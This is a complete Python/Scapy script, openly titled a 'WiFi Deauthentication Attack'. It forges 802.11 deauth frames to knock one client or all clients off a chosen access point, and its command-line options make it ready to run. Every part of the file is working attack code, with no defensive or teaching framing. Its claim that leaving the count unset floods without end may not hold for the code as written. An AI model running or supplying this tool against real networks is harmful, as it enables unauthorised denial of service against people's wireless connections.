from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth

def deauth_attack(interface, ap_mac, client_mac=None, count=None, verbose=True):
    """
    Perform a deauthentication attack
    
    :param interface: Network interface in monitor mode
    :param ap_mac: MAC address of the access point
    :param client_mac: MAC address of the client to target (None for broadcast)
    :param count: Number of packets to send (None for infinite)
    :param verbose: Show packet information
    """
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: BSSID (AP MAC)
    
    if client_mac:
        # Targeted deauth (client specific)
        pkt = Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
    else:
        # Broadcast deauth (all clients)
        pkt = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
    
    if verbose:
        if client_mac:
            print(f"Sending deauth to {client_mac} from {ap_mac}")
        else:
            print(f"Sending broadcast deauth from {ap_mac}")
    
    sendp(pkt, iface=interface, count=count, inter=0.1, verbose=0)

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="WiFi Deauthentication Attack")
    parser.add_argument("-i", "--interface", required=True, help="Network interface in monitor mode")
    parser.add_argument("-a", "--ap", required=True, help="MAC address of the access point")
    parser.add_argument("-c", "--client", help="MAC address of the client to target (optional)")
    parser.add_argument("-n", "--count", type=int, help="Number of packets to send (default: infinite)")
    
    args = parser.parse_args()
    
    deauth_attack(args.interface, args.ap, args.client,args.count)